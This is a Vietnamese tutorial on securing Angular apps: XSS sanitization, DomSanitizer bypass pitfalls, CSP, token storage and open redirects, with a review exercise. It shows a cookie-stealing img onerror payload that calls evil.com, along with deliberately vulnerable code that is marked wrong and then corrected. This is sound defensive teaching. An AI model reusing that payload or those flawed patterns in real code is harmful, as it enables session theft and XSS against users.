Bảo mật ứng dụng Angular

Angular chống XSS ra sao, DomSanitizer và các bẫy bypass, CSP, CSRF, lưu token ở đâu, bảo vệ route không phải là bảo mật.

Học xong bài này bạn sẽ:
  • Hiểu cơ chế sanitize của Angular
  • Cấu hình CSP cho ứng dụng Angular
  • Lưu và gửi thông tin đăng nhập an toàn

#Ranh giới đầu tiên: frontend không bảo vệ được gì

Mọi thứ chạy trên trình duyệt đều do người dùng kiểm soát: họ đọc được JavaScript, sửa được request, gọi thẳng API. Guard, ẩn nút theo quyền, validate form là trải nghiệm, không phải bảo mật. Bảo mật thật nằm ở server. Phần của frontend là: không tạo ra lỗ hổng mới (XSS), bảo vệ phiên đăng nhập, và không làm lộ dữ liệu.

#Angular chống XSS mặc định

TypeScript
comment = signal('<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)"> Bài làm tốt');
Template
<p>{{ comment() }}</p>             <!-- hiện nguyên văn chữ, không chạy được -->
<p [innerHTML]="comment()"></p>    <!-- Angular sanitize: bỏ onerror, giữ thẻ img an toàn -->
Console của trình duyệt (chế độ phát triển)Mô phỏng
WARNING: sanitizing HTML stripped some content, see https://angular.dev/best-practices/security#xss
Ngữ cảnhAngular làm gì
Interpolation {{ }}, [textContent]escape: luôn là chữ
[innerHTML]sanitize HTML: bỏ script, thuộc tính sự kiện, link javascript:
[href], [src]sanitize URL: chặn javascript:, giữ http(s), mailto, data ảnh
[style]sanitize style
Templateđược biên dịch lúc build, người dùng không chèn được template (khác với ghép chuỗi HTML)

Vue: {{ }} cũng escape, nhưng v-html không sanitize gì cả, bạn phải tự dùng DOMPurify. Angular sanitize sẵn cho [innerHTML]. Ngược lại, Angular có cửa hậu bypassSecurityTrust... mà bạn phải cẩn thận.

DomSanitizer và bypass

TypeScriptSai / nguy hiểm
// ✘ Lấy HTML người dùng nhập rồi bypass: mở toang XSS
this.html = this.sanitizer.bypassSecurityTrustHtml(userInput);
// ✘ URL do người dùng nhập
this.link = this.sanitizer.bypassSecurityTrustResourceUrl(userUrl); // <iframe [src]="link">
TypeScriptĐúng / nên làm
// ✓ Chỉ bypass dữ liệu do chính bạn tạo, đã kiểm tra: ví dụ URL nhúng video từ danh sách cho phép
const id = parseYoutubeId(input);          // chỉ lấy đúng 11 ký tự [A-Za-z0-9_-]
if (id) this.embed = this.sanitizer.bypassSecurityTrustResourceUrl(`https://www.youtube.com/embed/${id}`);

Quy tắc khi review code: mọi dòng có bypassSecurityTrust phải trả lời được "giá trị này có thể chứa dữ liệu người dùng không?". Có thì phải lọc trước, tốt nhất là không dùng.

Những chỗ Angular không bảo vệ: ElementRef.nativeElement.innerHTML = ..., document.write, thư viện bên ngoài nhận HTML (trình soạn thảo, thư viện markdown), eval / new Function. Với nội dung giàu định dạng do người dùng nhập, dùng DOMPurify rồi mới đưa vào.

#Content Security Policy

CSP là lớp phòng thủ thứ hai: kể cả khi kẻ xấu chèn được script, trình duyệt từ chối chạy.

header từ server / CDN
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://files.sobaitap.vn; connect-src 'self' https://api.sobaitap.vn; frame-ancestors 'none'; base-uri 'self'; form-action 'self'

Với Angular cần lưu ý:

  • Bản build mặc định "inline critical CSS" sinh một đoạn script nội tuyến nhỏ. Với script-src 'self' chặt, tắt nó: "optimization": { "styles": { "inlineCritical": false } }, hoặc dùng nonce (ngCspNonce / CSP_NONCE) khi có SSR.
  • Không thêm <script> nội tuyến vào index.html, đưa ra file .js trong public/.
  • Trusted Types: Angular hỗ trợ (require-trusted-types-for 'script'; trusted-types angular angular#unsafe-bypass), chặn thêm các đường XSS qua DOM.

core/safe-next.ts
export function safeNext(next: string | null | undefined, fallback = '/'): string {
  // chỉ cho phép đường dẫn nội bộ: '/lop/5' được, '//evil.com' và 'https://evil.com' không
  return next && next.startsWith('/') && !next.startsWith('//') && !next.startsWith('/\\') ? next : fallback;
}

#Bài tập

Rà soát bảo mật một component

Tìm và sửa 4 vấn đề bảo mật trong component dưới đây.

TypeScriptSai / nguy hiểm
@Component({
  selector: 'app-profile',
  template: `
    <h2 [innerHTML]="bioHtml"></h2>
    <a [href]="website">Website</a>
    <button (click)="goNext()">Tiếp tục</button>
  `,
})
export class Profile {
  private sanitizer = inject(DomSanitizer);
  private route = inject(ActivatedRoute);
  bioHtml: SafeHtml = '';
  website: SafeUrl = '';

  constructor() {
    inject(UserApi).me().subscribe((u) => {
      this.bioHtml = this.sanitizer.bypassSecurityTrustHtml(u.bio);       // 1
      this.website = this.sanitizer.bypassSecurityTrustUrl(u.website);    // 2
      localStorage.setItem('token', u.accessToken);                        // 3
      console.log('user', u);
    });
  }

  goNext() {
    location.href = this.route.snapshot.queryParamMap.get('next') ?? '/'; // 4
  }
}

Gợi ý từng bước

  1. u.bio và u.website là dữ liệu người dùng tự nhập.
  2. Token: có cần lưu ở frontend không? Nếu dùng cookie HttpOnly thì không.
  3. next có thể là https://trang-gia-mao.com hoặc javascript:....
  4. Log cả object người dùng (có token) ra console.
Xem lời giải
TypeScriptĐúng / nên làm
@Component({
  selector: 'app-profile',
  template: `
    <h2 [innerHTML]="bio()"></h2>                         <!-- Angular tự sanitize -->
    @if (website(); as w) { <a [href]="w" rel="noopener noreferrer" target="_blank">Website</a> }
    <button (click)="goNext()">Tiếp tục</button>
  `,
})
export class Profile {
  private route = inject(ActivatedRoute);
  private router = inject(Router);
  private me = toSignal(inject(UserApi).me());
  protected bio = computed(() => this.me()?.bio ?? '');
  protected website = computed(() => {
    const w = this.me()?.website ?? '';
    return /^https?:\/\//i.test(w) ? w : null;           // chỉ http(s)
  });

  goNext() {
    this.router.navigateByUrl(safeNext(this.route.snapshot.queryParamMap.get('next')));
  }
}
  1. XSS qua bio: bỏ bypassSecurityTrustHtml, để Angular sanitize.
  2. URL độc: bypassSecurityTrustUrl cho phép javascript:. Bỏ bypass, chỉ nhận http(s), thêm rel="noopener noreferrer" khi mở tab mới.
  3. Token trong localStorage và log ra console: server nên dùng cookie HttpOnly, frontend không cần chạm token. Không log object chứa dữ liệu nhạy cảm.
  4. Open redirect: next có thể đưa người dùng sang trang giả mạo ngay sau khi đăng nhập. Chỉ chấp nhận đường dẫn nội bộ qua safeNext, điều hướng bằng router.
